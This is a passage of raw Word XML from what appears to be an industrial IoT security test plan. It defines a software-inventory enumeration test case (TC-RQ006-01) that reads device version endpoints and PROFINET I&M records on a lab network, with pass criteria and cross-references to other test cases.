              </w:rPr>
              <w:t xml:space="preserve">(reuse </w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ004-02</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> passive plaintext capture of the inventory read + confirm no TLS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52C0D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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>confidentiality</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B407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7EC87" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">NIST SP 800-115 §3.5; OWASP ISTG-DES-INFO; ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-005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9CFE9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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="75FC7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B07BD" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="21" w:author="Unknown">
              <w:r w:rsidRPr="005B4077">
                <w:delText>TS-4 — MITM inventory falsification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4CD62" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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7EC6A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Moved → RQ-005</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (TC-RQ005-… identity/image integrity). </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t>Cross-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>referenced</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077"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560C0" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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D48BD" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="710278EE" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-1/TS-2 over the </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>management path</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pi eth1 = 192.168.50.10 → IoT-Core; browser 192.168.50.20); TS-3 passive on the laptop mirror. </w:t>
      </w:r>
      <w:hyperlink r:id="rId145" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId146" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06E6297E" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="23E0D5DA">
          <v:rect id="_x0000_i1417" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D270F5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12444AF6" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entry for the requirement-specific baseline (TS-1) and the decisive SBOM-completeness proof (TS-2). TS-3 executes per the already-issued </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ004-02</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>No MITM/inventory-integrity entry</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-005).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FC7EAE" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="0378DDF2">
          <v:rect id="_x0000_i1418" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5194C5B5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ006-01 — Installed-Software Inventory Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53718B31" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077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7769"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="215632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F5B9DB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E7E557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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="0C2312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057BF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2FAFA" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>TC-RQ006-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="72B0A1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2F243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4D4B3" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">RQ-006 (EHSR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>identification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obligation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>software</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>) → CR 7.8 → Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="182E5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2617A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27424" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Information Disclosure / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>incomplete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inventory</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="46655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03A52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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B407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A4210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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="56398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82F23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51167" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Enumerate the complete set of installed-software identifiers and confirm coverage of the software </w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>necessary for safe operation</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: host firmware, both bootloaders, SCPU firmware, and the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> stack. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Compile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the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actual</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:lastRenderedPageBreak/>
              <w:t>inventory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as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the</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> CR 7.8 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>baseline</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="144D6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F3986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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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EAE9B" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>1. Read all /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>swinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/* and /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>swrevision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. 2. Read I&amp;M0 SOFTWARE_REVISION and I&amp;M5 annotation. 3. Read /firmware/version and /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. 4. Assemble the inventory; map each entry to the safety function it supports.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="5FC18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F390F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CFCF9" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS (partial-conformance baseline)</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> host FW, both bootloaders, SCPU FW, and the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>-stack version are all retrievable and internally consistent (I&amp;M0/I&amp;M5 agree with /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/*). </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Documented shortfall</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> where any safety-relevant installed component is not individually identified (feeds SBOM gap G-1).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F76989A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077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511"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="6C8FC8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C91527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3D3E66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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="138CD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D7396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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B407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822D2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>TC-RQ006-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="2C52C6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C20D5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44047" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="4ED5B8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071BE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881BA" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>curl / IoT-Core visualizer; PROFINET acyclic read for I&amp;M0/I&amp;M5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7816D0EA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# TC-RQ006-01 Installed-software inventory enumeration (software-only; no data fingerprint)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E59A855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 xml:space="preserve">for ep in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swrevision</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709B7A26" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cpubootloaderversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AA09A1" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714028D9" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
